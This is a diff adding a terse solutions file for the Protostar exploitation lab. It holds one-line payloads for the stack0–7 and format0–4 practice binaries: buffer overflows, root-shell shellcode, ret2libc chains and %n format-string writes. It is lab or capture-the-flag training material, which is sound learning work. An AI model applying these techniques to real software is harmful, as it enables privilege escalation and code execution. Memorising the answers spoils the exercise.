@@ -1,0 +1,41 @@
+shell -> bashshell
+
+stack0
+(python -c 'print "A" * 64 + "B"';cat) | /opt/protostar/bin/stack0
+
+stack1
+/opt/protostar/bin/stack1 `python -c 'print "A" * 64 + "\x64\x63\x62\x61"'`
+
+stack2
+export GREENIE=`python -c 'print "A" * 64 + "\x0a\x0d\x0a\x0d"'`
+/opt/protostar/bin/stack2
+
+stack3
+(python -c 'print "A" * 64 + "\x24\x84\x04\x08"') | /opt/protostar/bin/stack3
+
+stack4
+(python -c 'print "A" * 72 + "BBBB" + "\xf4\x83\x04\x08"') | /opt/protostar/bin/stack4
+
+stack5
+(python -c 'print "\x90" * 19 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc1\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "A" * 12 + "BBBB" + "\x90\xf7\xff\xbf"'; cat) | /opt/protostar/bin/stack5
+
+stack6
+(python -c 'print "A" * 76 + "BBBB" + "\xb0\xcf\x05\x40" + "DDDD" + "\xbf\x33\x14\x40"';cat) | /opt/protostar/bin/stack6
+
+stack7
+(python -c 'print "A" * 76 + "BBBB" + "\xb0\xcf\x05\x40" + "DDDD" + "\xbf\x33\x14\x40"';cat) | /opt/protostar/bin/stack7
+
+Format0
+/opt/protostar/bin/format0 `(python -c 'print "%64d" + "\xef\xbe\xad\xde"')`
+
+Format1
+/opt/protostar/bin/format1 `(python -c 'print "AA\x38\x96\x04\x08DD" + "%133$n" ')`
+
+Format2
+(python -c 'print "\xe4\x96\x04\x08" +"%60c" +"%4$n"' ; cat) |  /opt/protostar/bin/format2
+
+Format3
+(python -c 'print "\xf4\x96\x04\x08" +"%16930112c" + "%12$n"' ; cat) |  /opt/protostar/bin/format3
+
+Format4
+(python -c 'print "\x24\x97\x04\x08" +"%134513840c" +"%4$n"') | /opt/protostar/bin/format4
